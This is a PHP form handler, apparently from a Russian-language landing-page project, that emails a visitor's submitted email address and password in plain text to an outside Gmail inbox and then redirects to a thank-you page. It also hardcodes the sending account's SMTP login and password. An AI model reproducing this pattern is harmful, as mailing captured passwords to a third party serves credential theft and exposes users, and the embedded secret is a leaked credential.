<?php
// Файлы phpmailer
require 'phpmailer/PHPMailer.php';
require 'phpmailer/SMTP.php';
require 'phpmailer/Exception.php';

// Переменные, которые отправляет пользователь
// $name = $_POST['name'];
// $phone = $_POST['phone'];
// $message = $_POST['message'];
$email = $_POST['email'];
$password= $_POST['password'];

// Формирование самого письма
$title = "Новое обращение Ehya";
$body = "
<h2>Новый пользователь</h2>

<b>Email:</b> $email<br>
<b> Пароль: </b> $password<br>
";

// Настройки PHPMailer
$mail = new PHPMailer\PHPMailer\PHPMailer();
try {
    $mail->isSMTP();   
    $mail->CharSet = "UTF-8";
    $mail->SMTPAuth   = true;
    $mail->SMTPDebug = 2;
    $mail->Debugoutput = function($str, $level) {$GLOBALS['status'][] = $str;};

    // Настройки вашей почты
    $mail->Host       = 'smtp.gmail.com'; // SMTP сервера вашей почты
    $mail->Username   = 'zhunya.bz@gmail.com'; // Логин на почте
    $mail->Password   = 'honeybee2020'; // Пароль на почте
    $mail->SMTPSecure = 'ssl';
    $mail->Port       = 465;
    $mail->setFrom('zhunya.bz@gmail.com', 'Евгения Канаева'); // Адрес самой почты и имя отправителя

    // Получатель письма
    $mail->addAddress('fluffylion2013@gmail.com');  

// Отправка сообщения
$mail->isHTML(true);
$mail->Subject = $title;
$mail->Body = $body;    

// Проверяем отравленность сообщения
if ($mail->send()) {$result = "success";} 
else {$result = "error";}

} catch (Exception $e) {
    $result = "error";
    $status = "Сообщение не было отправлено. Причина ошибки: {$mail->ErrorInfo}";
}

// Отображение результата
//echo json_encode(["result" => $result, "resultfile" => $rfile, "status" => $status]);
header('Location: thankyou.html');